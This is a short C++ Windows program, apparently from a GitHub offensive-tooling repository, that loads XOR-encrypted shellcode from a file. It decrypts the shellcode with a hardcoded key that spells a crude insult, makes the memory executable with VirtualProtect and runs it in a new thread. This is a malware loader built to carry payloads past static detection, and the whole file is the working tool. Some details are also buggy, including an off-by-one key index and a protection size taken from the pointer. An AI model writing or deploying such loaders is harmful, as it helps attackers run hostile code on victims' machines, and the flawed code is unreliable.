// Ab4y98 : github.com/Ab4y98

#include <windows.h>
#include <iostream>
#include <string>


// Function to load shellcode from a file into memory
unsigned char* LoadShellcode(LPCWSTR filePath, DWORD* size) {
    // Open the file containing the shellcode
    HANDLE hFile = CreateFile(
        filePath,                 // File name
        GENERIC_READ,             // Access mode
        0,                        // No sharing
        NULL,                     // No security
        OPEN_EXISTING,            // Open the file if it exists
        FILE_ATTRIBUTE_NORMAL,    // Nosrmal file attributes
        NULL                      // No template file
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to open file, error %lu\n", GetLastError());
        return NULL;
    }

    // Get the size of the file
    *size = GetFileSize(hFile, NULL);
    if (*size == INVALID_FILE_SIZE) {
        printf("Failed to get file size, error %lu\n", GetLastError());
        CloseHandle(hFile);
        return NULL;
    }

    // Allocate memory for the shellcode
    unsigned char* buffer = (unsigned char*)malloc(*size);
    if (buffer == NULL) {
        printf("Failed to allocate memory\n");
        CloseHandle(hFile);
        return NULL;
    }

    // Read the shellcode from the file into the buffer
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, *size, &bytesRead, NULL)) {
        printf("Failed to read file, error %lu\n", GetLastError());
        free(buffer);
        CloseHandle(hFile);
        return NULL;
    }

    // Close the file handle
    CloseHandle(hFile);

    return buffer;  // Return the buffer containing the shellcode
}


VOID XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {

    for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
        // if end of the key, start again
        if (j > sKeySize)
        {
            j = 0;
        }
        pShellcode[i] = pShellcode[i] ^ bKey[j];

    }

}


unsigned char key[] = { 0x66, 0x75, 0x63, 0x6B, 0x6F, 0x66, 0x66, 0x6C, 0x69, 0x74, 0x74, 0x6C, 0x65, 0x62, 0x69, 0x74, 0x63, 0x68 };
int main() {

    DWORD shellcodeSize = 0;
    unsigned char* shellcode = LoadShellcode(L"shellcode_enc.bin", &shellcodeSize);
    printf("Shellcode Address: %p\n", shellcode);


    if (shellcode != NULL) {
        // Optionally, you can print the loaded shellcode in hexadecimal for verification
        printf("Encrypted Shellcode loaded: ");
        for (DWORD i = 0; i < shellcodeSize; i++) {
            printf("%02x ", shellcode[i]);
        }
        printf("\n");

        printf("[#] Press <Enter> To Continue ... ");
        getchar();

        XorByInputKey(PBYTE(shellcode), shellcodeSize, PBYTE(key), sizeof(key));

        printf("Decrypted Shellcode loaded: ");
        for (DWORD i = 0; i < shellcodeSize; i++) {
            printf("%02x ", shellcode[i]);
        }
        printf("\n");

        DWORD dwOldProtection = NULL;

        if (!VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
            printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
            return -1;
        }

        printf("[#] Press <Enter> To Run ... ");
        getchar();
        if (CreateThread(NULL, NULL, LPTHREAD_START_ROUTINE(shellcode), NULL, NULL, NULL) == NULL) {
            printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
            return -1;
        }

        HeapFree(GetProcessHeap(), 0, shellcode);
        printf("[#] Press <Enter> To Quit ... ");
        getchar();

        return 0;
    }
}